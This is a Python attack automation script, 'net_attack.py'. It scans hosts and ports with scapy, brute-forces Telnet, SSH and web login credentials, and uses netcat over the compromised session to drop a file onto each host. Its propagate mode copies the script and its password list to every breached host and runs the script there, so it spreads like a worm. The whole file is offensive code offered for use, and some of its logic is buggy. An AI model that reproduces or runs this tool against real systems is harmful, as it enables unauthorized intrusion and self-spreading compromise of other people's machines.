try:
    import sys
    import scapy.all as scapy 
    import telnetlib 
    import paramiko 
    import requests 
    import time 
    import socket 
except ImportError:
    print("[!]Failed import Library")


def help(): #prints the usage of the tool.
    usage = """
    usage: net_attack.py [-h] [-t IP ADDRESSES] [-p PORTS] [-u USERNAME] [-f PASSWORDS] [-d FİLE]

    Attack Automation Tool

    options:
    -h, --help    show this help message and exit
    -t IP ADDRESSES  Filename for a file containing a list of IP addresses
    -p PORTS    Ports to scan on the target host
    -u USERNAME    A username
    -f PASSWORDS   Filename for a file containing a list of passwords
    -d File to deploy on target machine
    -L Local scan
    -P Propagate
    """
    print(usage)
    sys.exit(1)


def read_ip_list(ip_file):
    """This Function Read ip file and return ip list"""

    file = open(ip_file,'r')
    ip_adresses = file.readlines()
    for i in range(len(ip_adresses)):
        ip_adresses[i] = ip_adresses[i].replace("\n","")

    return ip_adresses


def is_reachable(ip):
    """It checks whether the IP address is reachable by sending a ping."""
    TIMEOUT = 2
    try:
        packet = scapy.IP(dst=ip,ttl=20)/scapy.ICMP()
        reply = scapy.sr1(packet,timeout=TIMEOUT,verbose=False)
        if not (reply is None) : 
            return True 
        return False
    except:
        return False


def scan_port(ip, port):
    """By sending a SYN packet to the target port, it checks whether it is open according to the response."""
    TIMEOUT = 2
    packet = scapy.IP(dst=ip)/scapy.TCP(dport=port,flags="S")
    response = scapy.sr1(packet,timeout=TIMEOUT,verbose = False)
    if response is None:
        return False 
    elif response.getlayer(scapy.TCP).flags == 0x12:
        return True
    return False 


def read_pass_file(pass_file):
    """This Function read password file and return password list"""
    file = open(pass_file,'r')
    passwords = file.readlines()
    for i in range(len(passwords)):
        passwords[i] = passwords[i].replace("\n","")

    return passwords


def bruteforce_telnet(ip, port, username, password_list_filename):
    """It tries to connect to port 23 with the given password and username."""
    passwords = read_pass_file(password_list_filename)
    for password in passwords:
        HOST = ip
        tn = telnetlib.Telnet(HOST,port)

        tn.read_until(b"login: ")
        tn.write(username.encode('ascii') + b"\n")
        if password:
            tn.read_until(b"Password: ")
            tn.write(password.encode('ascii') + b"\n")

        (control,obj,byte) = tn.expect([b'incorrect',b'@'],2)
        if control == 1:
            return f"{username}:{password}"    
    tn.close()
    return "" 


def bruteforce_ssh(ip, port, username, password_list_filename):
    """It tries to connect to port 22 with the given password and username."""
    passwords = read_pass_file(password_list_filename)
    for password in passwords:
        client = paramiko.client.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(ip, username=username, password=password,timeout=3)
        except:
            return ""
        else:
            return(f"{username}:{password}")


def bruteforce_web(ip, port, username, password_list_filename):
    """it tries to login to the page with the given password and username."""
    url = f"http://{ip}:{port}/login.php"
    try:
        r = requests.get(url,timeout=3)
    except:
        return "" 
    if r.status_code == 200:
        passwords = read_pass_file(password_list_filename)
        for password in passwords:
            data = {"username": username, "password": password}
            try:
                send_data_url = requests.post(url, data=data,timeout=5)
            except:
                return ""
        if "Welcome" in str(send_data_url.content):
            return f"{username}:{password}"
    return ""
    

def telnet_send(ip,result,file):
    """Receives incoming packet by infiltrating via telnet port"""
    r = result.split(":")
    username = r[0]
    password = r[1]
    HOST = ip 
    tn = telnetlib.Telnet(HOST) 
    tn.read_until(b"login: ")
    tn.write(username.encode('ascii') + b"\n")
    if password:
        tn.read_until(b"Password: ")
        tn.write(password.encode('ascii') + b"\n")
    command = f"nc -l -p 1234  > {file}\n"
    tn.write(bytes(command,"utf-8"))
    time.sleep(1)
    send_data(ip,file) 
    time.sleep(3)
    tn.close()


def ssh_send(ip,result,file):
    """Receives incoming packet by infiltrating via ssh port"""
    r = result.split(':')
    username=r[0]
    password=r[1]

    cmd=f"nc -l -p 1234  > {file}\n"

    ssh=paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(ip,22,username,password)

    stdin,stdout,stderr=ssh.exec_command(cmd)
    time.sleep(1)
    send_data(ip,file)
    time.sleep(3)
    outlines=stdout.readlines()


def send_data(ip,file_to_send):
    """sends data to destination from port 1234"""
    file = open(file_to_send,"r")
    data = file.read()
    MESSAGE = bytes(data,"utf-8")
    port = 1234
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send(MESSAGE)
    s.close()


def get_local_ip():
    ip_addresses = []
    iface = scapy.IFACES.data
    for i in iface:
        ip = scapy.get_if_addr(i)
        ip_addresses.append(str(ip))
    return ip_addresses


def run_command_telnet(ip,result,cmd):
    r = result.split(":")
    username = r[0]
    password = r[1]
    HOST = ip 
    tn = telnetlib.Telnet(HOST) 
    tn.read_until(b"login: ")
    tn.write(username.encode('ascii') + b"\n")
    if password:
        tn.read_until(b"Password: ")
        tn.write(password.encode('ascii') + b"\n")
    command = f"{cmd}\n"
    tn.write(bytes(command,"utf-8"))
    print("[*]Running net_attack.py on target")
    time.sleep(20)


def run_command_ssh(ip,result,cmd):
    r = result.split(':')
    username=r[0]
    password=r[1]

    command=f"{cmd}\n"

    ssh=paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(ip,22,username,password)

    stdin,stdout,stderr=ssh.exec_command(command)
    print("[*]Running net_attack.py on target")
    time.sleep(20)
    outlines=stdout.readlines()


def main():
    """main function that takes the arguments and executes the correct functions"""
    send = False 
    propagate = False
    if len(sys.argv) >=9:
        tmp = sys.argv[1:]
        if str(tmp[0].lower())=="-t":
            ip_file = tmp[1]
            ip_addresses = read_ip_list(ip_file)
        elif str(tmp[0].lower())=="-l":
            ip_addresses = get_local_ip()
        else:
            help()
        if str(tmp[2].lower())=="-p":
            ports_to_scan = tmp[3]
            ports = ports_to_scan.split(",")
        if str(tmp[4].lower())=="-u":
            username = tmp[5]
        if str(tmp[6].lower())=="-f":
            passwords_file = tmp[7]
        if len(sys.argv) > 9 :
            if str(tmp[8].lower())=="-d":
                file_to_send = tmp[9]
                send = True
            elif str(tmp[8].lower()) == "-p":
                propagate = True 
            else:
                help() 
    else: 
        help()


    print("Searching for reachable IP addresses....")
    reachable_ip = []
    for ip in ip_addresses:
        reachable = is_reachable(ip)
        if reachable == True:
            reachable_ip.append(ip)

    open_ports=[]
    for ip in reachable_ip:
        print("*"*25)
        print(ip)
        for port in ports:
            is_open = scan_port(ip,int(port))
            if is_open:
                print(port,": Open")
                open_ports.append(f"{ip},{port}")
            else:
                print(port,": Close")

                
    for i in open_ports:
        ports = i.split(',')
        ip = ports[0]
        port = ports[1]
        if int(port) == 23:
            result = bruteforce_telnet(ip,int(port),username,passwords_file)
            if result != "":
                print(f"[*]Telnet Password Found.\n {ip} ==> {result} \n") 
                if send:
                    telnet_send(ip,result,file_to_send)
                    send = False
                if propagate:
                    r = result.split(':')
                    command = f"python3 net_attack.py -L -p 22,23,80,8080,8888 -u {r[0]} -f passwords.txt -p"
                    telnet_send(ip,result,"passwords.txt")
                    telnet_send(ip,result,"net_attack.py")
                    run_command_telnet(ip,result,command)
                    propagate=False

        if int(port) == 22:
            result = bruteforce_ssh(ip,int(port),username,passwords_file)
            if result != "":
                print(f"[*]SSH Password Found.\n {ip} ==> {result}\n")
                if send:
                    ssh_send(ip,result,file_to_send)
                    send = False
                if propagate:
                    r = result.split(':')
                    command = f"python3 net_attack.py -L -p 22,23,80,8080,8888 -u {r[0]} -f passwords.txt -p"
                    ssh_send(ip,result,"passwords.txt")
                    ssh_send(ip,result,"net_attack.py")
                    run_command_ssh(ip,result,command)
                    propagate=False

        if int(port) == 80 or int(port) == 8080 or int(port) == 8888:
            result = bruteforce_web(ip,int(port),username,passwords_file)
            if result != "":
                print(f"[*]Login Page Password Found.\n {ip} ==> {result}\n")

if __name__=='__main__':
    main()